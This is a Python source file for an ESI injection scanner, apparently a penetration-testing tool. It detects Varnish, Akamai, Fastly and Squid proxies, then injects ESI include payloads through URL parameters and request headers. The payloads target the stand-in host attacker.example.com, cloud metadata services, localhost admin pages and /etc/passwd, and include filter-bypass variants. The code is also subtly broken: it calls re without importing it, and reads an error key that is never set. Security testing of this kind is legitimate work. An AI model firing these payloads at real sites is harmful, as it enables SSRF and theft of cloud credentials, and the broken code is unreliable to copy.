#!/usr/bin/env python3
"""
esi_scanner.py — Edge Side Includes (ESI) injection scanner.

Detects ESI-capable CDN/proxy (Varnish, Akamai, Fastly, Squid) via headers,
then tests ESI injection payloads for SSRF and information disclosure.

Usage:
  python3 tools/esi_scanner.py --url https://app.example.com/
  python3 tools/esi_scanner.py --url https://app.example.com/ --dry-run
  python3 tools/esi_scanner.py --url https://app.example.com/ --rate 0.5 --json
"""

import argparse
import json
import time
import urllib.request
import urllib.error
import urllib.parse

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# ─── ESI Detection: Headers indicating ESI-capable proxy/CDN ──────────────────

ESI_INDICATOR_HEADERS = {
    # Header name (lowercase) → {value substring → CDN/proxy name}
    "surrogate-control": {
        "esi/1.0":     "Akamai / Varnish (Surrogate-Control: content=\"ESI/1.0\")",
        "content=":    "Generic Surrogate-Control (may support ESI)",
    },
    "x-cache": {
        "varnish":     "Varnish Cache",
        "hit":         "Generic cache hit (possible ESI support)",
        "miss":        "Generic cache miss",
    },
    "x-varnish": {
        "":            "Varnish (presence of X-Varnish header)",
    },
    "via": {
        "varnish":     "Varnish via header",
        "squid":       "Squid proxy",
        "akamai":      "Akamai CDN",
        "cloudfront":  "AWS CloudFront",
        "fastly":      "Fastly CDN",
        "1.1 vegur":   "Heroku routing",
    },
    "x-served-by": {
        "cache-":      "Fastly CDN",
    },
    "x-cache-hits": {
        "":            "Fastly CDN (presence of X-Cache-Hits)",
    },
    "server": {
        "varnish":     "Varnish",
        "squid":       "Squid",
        "akamai":      "Akamai",
        "esi":         "ESI-capable server",
    },
    "age": {
        "":            "Caching layer present (Age header)",
    },
}

# ─── ESI Injection Payloads ───────────────────────────────────────────────────

# Generic SSRF via ESI include
ESI_GENERIC_SSRF = '<esi:include src="http://attacker.example.com/esi-ssrf-probe"/>'

# Fastly-specific ESI variants
ESI_FASTLY_VARIANTS = [
    '<esi:include src="$$url{\'http://attacker.example.com/fastly-esi\'}$$"/>',
    '<esi:include src="http://attacker.example.com/" dca="esi"/>',
]

# Akamai ESI
ESI_AKAMAI_VARIANTS = [
    '<esi:include src="http://attacker.example.com/akamai-esi"/>',
    '<esi:include src="$(HTTP_HOST)/esi-probe"/>',
]

# Varnish / Squid
ESI_VARNISH_VARIANTS = [
    '<esi:include src="http://attacker.example.com/varnish-esi"/>',
    '<esi:remove><p>This should be removed</p></esi:remove>',
    '<esi:comment text="test"/>',
]

# SSRF via internal network
ESI_SSRF_INTERNAL = [
    '<esi:include src="http://169.254.169.254/latest/meta-data/"/>',
    '<esi:include src="http://169.254.169.254/latest/user-data"/>',
    '<esi:include src="http://metadata.google.internal/computeMetadata/v1/"/>',
    '<esi:include src="http://100.100.100.200/latest/meta-data/"/>',
    '<esi:include src="http://localhost:8080/admin"/>',
    '<esi:include src="http://127.0.0.1/etc/passwd"/>',
]

# XSS via ESI
ESI_XSS_VARIANTS = [
    '<esi:include src="http://attacker.example.com/xss.html"/>',
    '<!--esi <esi:include src="http://attacker.example.com/esi-comment-xss"/> -->',
]

# Injection bypass techniques
ESI_BYPASS_VARIANTS = [
    # Encoded variants
    '%3Cesi:include%20src%3D%22http://attacker.example.com/esi%22/%3E',
    # Comment bypass
    '<!--esi--><esi:include src="http://attacker.example.com/comment-bypass"/>',
    # Whitespace variants
    '<esi:include\tsrc="http://attacker.example.com/tab-bypass"/>',
    '<ESI:INCLUDE src="http://attacker.example.com/case-bypass"/>',
]

# Parameters that may reflect content as ESI-parseable
REFLECTION_PARAMS = [
    "q", "search", "name", "title", "content", "message", "text",
    "description", "comment", "body", "data", "input", "value",
]


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, extra_headers: dict | None = None,
              timeout: int = 10) -> tuple[int, dict, str]:
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            resp_headers = {k.lower(): v for k, v in r.headers.items()}
            return r.status, resp_headers, body
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        resp_headers = {k.lower(): v for k, v in e.headers.items()}
        return e.code, resp_headers, body
    except Exception as e:
        return 0, {}, str(e)


def record(test: str, result: str, detail: str, severity: str = "HIGH"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


# ─── ESI Detection ────────────────────────────────────────────────────────────

def detect_esi_headers(headers: dict) -> list[tuple[str, str]]:
    """Return list of (header, description) that indicate ESI support."""
    detections = []
    for header_name, value_map in ESI_INDICATOR_HEADERS.items():
        if header_name not in headers:
            continue
        header_val = headers[header_name].lower()
        for substr, description in value_map.items():
            if substr == "" or substr in header_val:
                detections.append((f"{header_name}: {headers[header_name]}", description))
                break
    return detections


def check_esi_response(body: str, original_payload: str) -> list[str]:
    """Detect if ESI payload was processed (tag removed, included content)."""
    signals = []
    # If the raw ESI tag was removed from output (proxy parsed it)
    if "<esi:" not in body and "<esi:" in original_payload:
        signals.append("ESI tag was stripped/processed (not reflected as-is)")
    # If attacker domain appeared in response (SSRF reflection)
    if re.search(r'(?<![.\w])attacker\.example\.com(?![.\w])', body):
        signals.append("Attacker domain reflected — possible ESI SSRF")
    # Internal metadata markers
    for marker in ("ami-", "instance-id", "computeMetadata", "user-data", "iam/"):
        if marker in body:
            signals.append(f"Cloud metadata marker in response: {marker}")
    return signals


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_header_detection(url: str, rate: float, dry_run: bool) -> bool:
    """Fetch URL and analyze response headers for ESI indicators."""
    print(f"\n{BOLD}[1] ESI-Capable Proxy/CDN Detection{RESET}")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would fetch {url} and analyze headers")
        _print_esi_header_table()
        return False

    time.sleep(1.0 / rate)
    status, headers, body = http_get(url)
    if status == 0:
        print(f"  {RED}[ERROR]{RESET} Could not reach {url}: {headers.get('_error', '')}")
        return False

    print(f"  {DIM}HTTP {status}, {len(headers)} headers{RESET}")
    print(f"\n  {BOLD}Response headers:{RESET}")
    for k, v in sorted(headers.items()):
        print(f"    {DIM}{k}: {v}{RESET}")

    detections = detect_esi_headers(headers)
    print(f"\n  {BOLD}ESI Indicators:{RESET}")
    if detections:
        for header_val, description in detections:
            color = YELLOW if "cache" in description.lower() or "hit" in description.lower() else RED
            print(f"  {color}[DETECTED]{RESET} {header_val}")
            print(f"    {DIM}→ {description}{RESET}")
            record(f"esi-header-{header_val.split(':')[0]}", "INTERESTING",
                   f"{header_val} → {description}")
    else:
        print(f"  {GREEN}No ESI indicator headers found{RESET}")

    return bool(detections)


def _print_esi_header_table():
    print(f"\n  {BOLD}Headers that indicate ESI support:{RESET}")
    for h, vals in ESI_INDICATOR_HEADERS.items():
        for substr, desc in vals.items():
            indicator = f"{h}: ...{substr}..." if substr else f"{h}: (present)"
            print(f"    {DIM}{indicator:45s} → {desc}{RESET}")


def test_esi_injection(url: str, rate: float, dry_run: bool, esi_confirmed: bool):
    print(f"\n{BOLD}[2] ESI Tag Injection Tests{RESET}")
    if not esi_confirmed:
        print(f"  {DIM}No ESI indicators detected — testing anyway (blind injection){RESET}")

    all_payloads = [
        ("generic-ssrf",          ESI_GENERIC_SSRF),
        ("fastly-variant-1",      ESI_FASTLY_VARIANTS[0]),
        ("fastly-variant-2",      ESI_FASTLY_VARIANTS[1]),
        ("akamai-include",        ESI_AKAMAI_VARIANTS[0]),
        ("varnish-include",       ESI_VARNISH_VARIANTS[0]),
        ("varnish-remove",        ESI_VARNISH_VARIANTS[1]),
        ("esi-comment",           ESI_VARNISH_VARIANTS[2]),
        ("metadata-imds",         ESI_SSRF_INTERNAL[0]),
        ("metadata-userdata",     ESI_SSRF_INTERNAL[1]),
        ("gcp-metadata",          ESI_SSRF_INTERNAL[2]),
        ("localhost-admin",       ESI_SSRF_INTERNAL[4]),
        ("xss-include",           ESI_XSS_VARIANTS[0]),
        ("comment-bypass",        ESI_BYPASS_VARIANTS[1]),
        ("case-bypass",           ESI_BYPASS_VARIANTS[3]),
    ]

    parsed = urllib.parse.urlparse(url)
    for name, payload in all_payloads:
        for param in REFLECTION_PARAMS[:4]:  # Test first 4 params per payload
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=f"{param}={urllib.parse.quote(payload, safe='')}")
            )
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} {name} via ?{param}=")
                print(f"    {DIM}Payload: {payload[:80]}{RESET}")
                break  # Show only once per payload in dry-run
            time.sleep(1.0 / rate)
            status, resp_headers, body = http_get(test_url)
            signals = check_esi_response(body, payload)
            if signals:
                record(f"esi-inject-{name}", "VULNERABLE",
                       f"?{param}={payload[:40]}: {'; '.join(signals)}")
                break
        else:
            if not dry_run:
                record(f"esi-inject-{name}", "BLOCKED", "No ESI processing signals detected")


def test_header_injection(url: str, rate: float, dry_run: bool):
    """Try injecting ESI via request headers that get reflected in responses."""
    print(f"\n{BOLD}[3] ESI Injection via Request Headers{RESET}")
    header_payloads = [
        ("X-Forwarded-Host",  f'<esi:include src="http://attacker.example.com/host-header-esi"/>'),
        ("Referer",           f'<esi:include src="http://attacker.example.com/referer-esi"/>'),
        ("User-Agent",        f'<esi:include src="http://attacker.example.com/ua-esi"/>'),
        ("Accept-Language",   f'<esi:include src="http://attacker.example.com/lang-esi"/>'),
    ]
    for hname, payload in header_payloads:
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Header {hname}: {payload[:60]}...")
            continue
        time.sleep(1.0 / rate)
        status, resp_headers, body = http_get(url, {hname: payload})
        signals = check_esi_response(body, payload)
        if signals:
            record(f"esi-header-inject-{hname}", "VULNERABLE",
                   f"Header {hname}: {'; '.join(signals)}")
        else:
            record(f"esi-header-inject-{hname}", "BLOCKED", f"HTTP {status}")


def print_payload_reference():
    print(f"\n{BOLD}ESI Payload Reference:{RESET}")
    all_payloads = [
        ("Generic SSRF",           ESI_GENERIC_SSRF),
        ("Fastly variant",         ESI_FASTLY_VARIANTS[0]),
        ("Akamai include",         ESI_AKAMAI_VARIANTS[0]),
        ("Varnish include",        ESI_VARNISH_VARIANTS[0]),
        ("IMDS SSRF",              ESI_SSRF_INTERNAL[0]),
        ("GCP metadata",           ESI_SSRF_INTERNAL[2]),
        ("Localhost admin",        ESI_SSRF_INTERNAL[4]),
        ("Comment bypass",         ESI_BYPASS_VARIANTS[1]),
    ]
    for name, payload in all_payloads:
        print(f"  {CYAN}{name:25s}{RESET} {DIM}{payload[:80]}{RESET}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ESI injection scanner")
    parser.add_argument("--url",     required=True, help="Target URL to scan")
    parser.add_argument("--rate",    type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show what would be tested without sending requests")
    parser.add_argument("--json",    action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║   ESI Injection Scanner              ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target : {CYAN}{args.url}{RESET}")
    print(f"  Rate   : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode   : {YELLOW}DRY-RUN (no requests sent){RESET}")

    print_payload_reference()

    esi_confirmed = test_header_detection(args.url, args.rate, args.dry_run)
    test_esi_injection(args.url, args.rate, args.dry_run, esi_confirmed)
    test_header_injection(args.url, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    interesting = [f for f in FINDINGS if f["result"] == "INTERESTING"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run   : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable  : {len(vulns)}{RESET}")
        for f in vulns:
            print(f"    {RED}→{RESET} {f['test']}: {f['detail']}")
    elif interesting:
        print(f"  {YELLOW}Interesting : {len(interesting)}{RESET}")
        print(f"  {DIM}ESI-capable proxy detected — manual injection testing recommended{RESET}")
    else:
        print(f"  {GREEN}No ESI indicators or injection signals found{RESET}")

    if args.json_output:
        print(json.dumps({"url": args.url, "esi_confirmed": esi_confirmed,
                           "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
